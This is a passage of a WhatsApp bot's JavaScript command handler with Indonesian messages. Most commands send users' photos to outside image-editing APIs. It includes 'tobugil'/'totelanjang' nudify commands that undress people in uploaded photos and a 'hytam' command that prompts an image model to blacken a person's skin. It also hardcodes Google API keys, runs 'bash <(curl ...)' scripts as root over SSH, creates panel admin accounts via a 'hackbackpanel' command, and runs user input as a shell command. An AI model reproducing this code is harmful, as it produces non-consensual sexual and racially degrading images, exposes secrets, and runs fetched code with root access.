        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = `Nih wir!! Gacor ga?! 😝🔥\n\n*PROMPT:*\n_"${text}"_`;
 
        await Putzz.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: qfake });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        ReplyLanz(`❌ Terjadi kesalahan saat memproses gambar.`);
    }
}
break;    
case 'tobersama': {

if (!isPremium) return ReplyLanz(mess.prem)
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return ReplyLanz(`mana foto nya?`);
    }
    if (!text) return ReplyLanz(`contoh ${command} nama idola mu`)
 
    ReplyLanz('Loading...');

    try {
        
        let media = await Putzz.downloadAndSaveMediaMessage(m.quoted);
        let directLink = await CatBox(media);
        
        const apiUrl = `https://api-faa.my.id/faa/tobersama?url=${directLink}&nama-artis=${text}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = `Nih wir!! Gacor ga?! 😝🔥\n\n*PROMPT:*\n_"${text}"_`;
 
        await Putzz.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: qfake });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        ReplyLanz(`❌ Terjadi kesalahan saat memproses gambar.`);
    }
}
break;    
case 'tosad':
case 'tosatan':
case 'tosdmtinggi':
case 'toreal':
case 'tomoai':
case 'tomaya':
case 'tolego':
case 'tokamboja':
case 'tokacamata':
case 'tojepang':
case 'toghibli':
case 'todubai':
case 'todpr':
case 'tochibi':
case 'tobrewok':
case 'tobabi':
case 'toblonde':
case 'tobotak':
case 'tohijab':
case 'tomekah':
case 'tomirror':
case 'tovintage':
case 'toanime': {

//if (!isPremium) return ReplyLanz(mess.prem)
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return ReplyLanz(`mana foto nya?`);
    }
 
    ReplyLanz('Loading...');

    try {
        
        let media = await Putzz.downloadAndSaveMediaMessage(m.quoted);
        let directLink = await CatBox(media);
        
        const apiUrl = `https://api-faa.my.id/faa/${command}?url=${encodeURIComponent(directLink)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = `Nih wir!! Gacor ga?! 😝🔥\n\n*PROMPT:*\n_"${text}"_`;
 
        await Putzz.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: qfake });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        ReplyLanz(`❌ Terjadi kesalahan saat memproses gambar.`);
    }
}
break;    

case 'tofigurav3':
case 'tofigurav2':
case 'tofigura': {

//f (!isPremium) return ReplyLanz(mess.prem)

 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return ReplyLanz(`mana foto nya?`);
    }
 
    ReplyLanz('Loading...');

    try {
        
        let media = await Putzz.downloadAndSaveMediaMessage(m.quoted);
        let directLink = await CatBox(media);
        
        const apiUrl = `https://api-faa.my.id/faa/${command}?url=${directLink}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = ``;
 
        await Putzz.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: qfake });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        ReplyLanz(`❌ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (media && fs.existsSync(media)) {
            fs.unlinkSync(media);
        }
    }
}
break;
       			
case 'jadisexy':
case 'tosexy': {

//if (!isPremium) return ReplyLanz(mess.prem)

 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return ReplyLanz(`mana foto nya?`);
    }
 
    ReplyLanz('Loading...');

    try {
        
        let media = await Putzz.downloadAndSaveMediaMessage(m.quoted);
        let directLink = await CatBox(media);
        
        const apiUrl = `https://api-faa.my.id/faa/tosexy?url=${directLink}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = ``;
 
        await Putzz.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: qfake });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        ReplyLanz(`❌ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (path && fs.existsSync(path)) {
            fs.unlinkSync(path);
        }
    }
}
break;
case 'totelanjang':
case 'tobugil': {
//if (!isPremium) return ReplyLanz(mess.prem)
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return ReplyLanz(`mana foto nya?`);
    }
    
    await reaksi('🚀') 
    try{
let media = await Putzz.downloadAndSaveMediaMessage(m.quoted);
let directLink = await CatBox(media);
const api = await fetchJson(`https://api.baguss.xyz/api/edits/tobugil?image=${directLink}`)
const result = api.url
const lembu = '';
await Putzz.sendMessage(
        m.chat,
        {
            image: result,
            caption: "."
        },
        { quoted: qfake }
    );
  }  catch (error) {
        console.error('Error di fitur aiedit:', error);
        ReplyLanz(`❌ Terjadi kesalahan saat memproses gambar.`);
    }
}
break;    
case "tofiguree":
case "photo-figure": {
  const { GoogleGenerativeAI } = require("@google/generative-ai");
  const fs = require("fs");

  let qmsg = m.quoted ? m.quoted : m;
  let mime = (qmsg.msg || qmsg).mimetype || "";
  if (!/image/.test(mime))
    return ReplyLanz(`Kirim atau reply foto dengan caption *${prefix + command}*`);

  if (mime === 'image/webp') mime = 'image/png';

  let promptText = text || 
  "Create a realistic 1/7 scale figurine of the person in the photo. The figurine stands on a clean desk with a transparent acrylic round base, with natural lighting.";

  ReplyLanz("🛠️ Sedang menjadikan foto figur...");

  try {
    let imgPath = await Putzz.downloadAndSaveMediaMessage(qmsg);
    let imgData = fs.readFileSync(imgPath);
    const base64Image = imgData.toString("base64");

    const genAI = new GoogleGenerativeAI("AIzaSyAS-KiW0SrwiYKwexeBcGPijBVHFg2R_vo");
    const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash" });

    const result = await model.generateContent({
      contents: [
        {
          parts: [
            { text: promptText },
            { inlineData: { mimeType: mime, data: base64Image } }
          ]
        }
      ]
    });

    let resultImage = null;
    const candidates = result.response?.candidates || [];
    if (candidates.length > 0) {
      const parts = candidates[0].content.parts;
      for (const part of parts) {
        if (part.inlineData?.data) {
          resultImage = Buffer.from(part.inlineData.data, "base64");
          break;
        }
      }
    }

    if (!resultImage) {
      return ReplyLanz("❌ Gagal membuat figur! (coba kirim foto lebih jelas atau ganti API key)");
    }

    const tempPath = `./figur_${Date.now()}.png`;
    fs.writeFileSync(tempPath, resultImage);

    await Putzz.sendMessage(
      m.chat,
      { image: { url: tempPath }, caption: `✅ *Berhasil menjadikan foto figur!*` },
      { quoted: m }
    );

    setTimeout(() => {
      try { fs.unlinkSync(tempPath); } catch {}
      try { fs.unlinkSync(imgPath); } catch {}
    }, 20000);

  } catch (error) {
    console.error(error);
    ReplyLanz(`Error: ${error.message}`);
  }
}
break;


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'ocr':
case 'readtext': {

try {
 const q = m.quoted ? m.quoted : m
 const mime =
 (q.msg || q).mimetype ||
 q.mimetype ||
 q.message?.imageMessage?.mimetype

 if (!mime || !/image/.test(mime))
 return ReplyLanz("⚠️ Kirim atau reply gambar dengan caption *ocr* untuk ekstrak teks.")

 await Putzz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

 const buffer = await q.download()
 const mimeType = /png/.test(mime) ? "image/png" : "image/jpeg"
 const imageBase64 = buffer.toString("base64")

 const url = "https://staging-ai-image-ocr-266i.frontend.encr.app/api/ocr/process"
 const res = await fetch(url, {
 method: "POST",
 headers: { "content-type": "application/json" },
 body: JSON.stringify({ imageBase64, mimeType }),
 })

 if (!res.ok) throw new Error(await res.text())
 const json = await res.json()

 const text = json.extractedText || "Teks tidak ditemukan."
 ReplyLanz(`📄 *Hasil OCR:*\n\n${text}`)

 await Putzz.sendMessage(m.chat, { react: { text: "✅", key: m.key } })

 } catch (err) {
 console.error(err)
 ReplyLanz("❌ Gagal melakukan OCR, coba lagi nanti.")
 await Putzz.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
 }
}
break			

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text || !text.split("|")) return ReplyLanz(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return ReplyLanz(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return ReplyLanz(mess.owner)
if (global.installtema == undefined) return ReplyLanz("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
ReplyLanz("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await ReplyLanz("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
ReplyLanz('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text || !text.split("|")) return ReplyLanz(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return ReplyLanz(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return ReplyLanz("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ReplyLanz("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await ReplyLanz("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
ReplyLanz('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "putzz-tqto": case 'tqto': case 'putz-thanks':{
let kontol = `\`[ 𝐎 𝐖 𝐍 𝐄 𝐑 - 𝐈 𝐍 𝐅 𝐎 ]\`
> ♚ ︳ᴄʀᴇᴀᴛᴏʀ : ${global.namaOwner}
> ♞ ︳ɴᴀᴍᴀ ʙᴏᴛ : ${global.botname}
> ♞ ︳ᴠᴇʀsɪ : 6.0.0
> ♞ ︳ᴛʏᴘᴇ : ᴄᴀsᴇ x ᴘʟᴜɢɪɴ
> ♞ ︳ᴛᴇʟᴇɢʀᴀᴍ : ᴘᴜᴛᴢsʟᴇʙᴇᴡ 
> ♛ ︳ᴡʜᴀᴛsᴀᴘᴘ ᴏᴡɴᴇʀ : ${global.owner}
${readmore}
◈➢ ​𝐭𝐡𝐚𝐧𝐤𝐬 𝐭𝐨 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ✆
┏━━━━━━━❏
┃
┃#𝐏𝐮𝐭𝐳𝐳 𝐬𝐢𝐠𝐦𝐚 𝐚𝐛𝐢𝐞𝐳
┃#𝐤𝐞𝐧𝐳𝐳 𝐦𝐨𝐝𝐞 𝐡𝐚𝐥𝐚𝐥
┃#𝐝𝐢𝐭𝐬𝐬 𝐬𝐢𝐡 𝐩𝐥𝐞𝐫 𝐤𝐮𝐝𝐚
┃#𝐩𝐢𝐪𝐚 𝐬𝐢𝐩𝐚𝐥𝐢𝐧𝐠 𝐢𝐦𝐮𝐩
┃#𝐬𝐤𝐲𝐳𝐨 𝐛𝐚𝐢𝐤 🗿
┃#𝐑𝐚𝐩𝐳𝐢𝐞𝐗𝐃
┃#𝐑𝐚𝐟𝐚 𝐃𝐞𝐯 𝐥𝐮𝐜𝐚𝐱
┃#𝐒ᴄᴘ𝟒𝐲𝐨𝐮 ᴍʏ ғʀɪᴇɴᴅ
┃
┃
┃sᴜᴘᴘᴏʀᴛ ᴅᴇᴠ ʙᴏᴛ
┗━━━━━━━━━━━━━─━─━━━━─❏`
ReplyLanz(kontol)
}
break
case "listurl": {

let thumb = await prepareWAMessageMedia(
{ image: { url: ppmenu } },
{ upload: Putzz.waUploadToServer }
)

let msg = generateWAMessageFromContent(m.chat,{
viewOnceMessage:{
message:{
interactiveMessage: proto.Message.InteractiveMessage.create({

header: proto.Message.InteractiveMessage.Header.create({
title: "Mikasa MD Menu",
subtitle: "LanzOfficial",
hasMediaAttachment: true,
...thumb
}),

body: proto.Message.InteractiveMessage.Body.create({
text: "Pilih menu dibawah"
}),

footer: proto.Message.InteractiveMessage.Footer.create({
text: "© PutzzSlebew"
}),

nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({

buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Open Menu",
sections: [
{
title: "Mikasa MD",
rows: [

{
title: "My Website",
description: "Open API Website",
buttons: [
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Open Website",
url: "https://lanzcihuyyy-apitermux.vercel.app",
merchant_url: "https://lanzcihuyyy-apitermux.vercel.app"
})
}
]
},

{
title: "Creator Lanz",
description: "Contact Owner",
buttons: [
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Chat Owner",
url: "https://wa.me/6283852426553",
merchant_url: "https://wa.me/6283852426553"
})
}
]
},

{
title: "Telegram",
description: "Channel Bot",
buttons: [
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Open Telegram",
url: "https://t.me/LanzOfficial",
merchant_url: "https://t.me/LanzOfficial"
})
}
]
},

{
title: "YouTube",
description: "Channel YouTube",
buttons: [
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Open YouTube",
url: "https://youtube.com",
merchant_url: "https://youtube.com"
})
}
]
},

{
title: "GitHub",
description: "Source Code",
buttons: [
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Open GitHub",
url: "https://github.com",
merchant_url: "https://github.com"
})
}
]
}

]
}
]
})
}
]

})

})
}
}
},{quoted:m})

await Putzz.relayMessage(msg.key.remoteJid,msg.message,{messageId:msg.key.id})

}
break
case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text || !text.split("|")) return ReplyLanz(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return ReplyLanz(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return ReplyLanz("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ReplyLanz("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await ReplyLanz("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6283824410117\n');
stream.write('https://whatsapp.com/channel/0029VayoPYX8qIzxe2C8TH2D\n');
stream.write('https://chat.whatsapp.com/BSVWst1LQgt7Lq0NVen3h9\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
ReplyLanz('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break


case 'hytam': {
  if (!m.quoted) return ReplyLanz(`Kirim/reply gambar dengan caption *${prefix + command}*`);
  //ogleGenerativeAI } = require ("@google/generative-ai");
  let defaultPrompt = "Ubahlah Karakter Dari Gambar Tersebut Diubah Kulitnya Menjadi Hitam se hitam-hitam nya";

    const q = m.quoted ? m.quoted : m
    const mime = (q.msg || q).mimetype || ''
    if (!/image/.test(mime))
      return ReplyLanz(`✨ Balas *gambar* dengan caption *.${command}*`)
  let promptText = text || defaultPrompt;
  ReplyLanz("Otw Menghitam...");

  try {
    let imgData = await m.quoted.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDdfNNmvphdPdHSbIvpO5UkHdzBwx7NVm0");

    const base64Image = imgData.toString("base64");

    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });

    const response = await model.generateContent(contents);

    let resultImage;
    let resultText = "";

    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }

    if (resultImage) {
      const tempPath = `./data/gemini_${Date.now()}.png`;
      fs.writeFileSync(tempPath, resultImage);

      await Putzz.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*berhasil menghitamkan*`
      }, { quoted: m });

      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      ReplyLanz("Gagal Menghitamkan.");
    }
  } catch (err) {
console.error("Error:", err);
await Putzz.sendMessage(m.chat, {
text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.",
  }, { quoted: m });
    }
  }
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "uninstallpanel": {
if (!isCreator) return ReplyLanz(msg.owner);
if (!text || !text.split("|")) return ReplyLanz(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return ReplyLanz(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await ReplyLanz("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ReplyLanz("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
ReplyLanz('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
ReplyLanz('STDERR: ' + data);
});
});
}).on('error', (err) => {
ReplyLanz('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installpanel": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return ReplyLanz(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await Putzz.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await ReplyLanz("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "startwings": case "configurewings": {
if (!isCreator) return ReplyLanz(mess.owner)
let t = text.split('|')
if (t.length < 3) return ReplyLanz(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await ReplyLanz("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
ReplyLanz('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
ReplyLanz('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return ReplyLanz(mess.owner)
let t = text.split('|')
if (t.length < 2) return ReplyLanz(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await Putzz.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
ReplyLanz('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "subdomain": case "subdo": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("skyzoo|ipserver"))
if (!text.split("|")) return ReplyLanz(example("skyzoo|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await Putzz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "domain": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!args[0]) return ReplyLanz("Domain tidak ditemukan!")
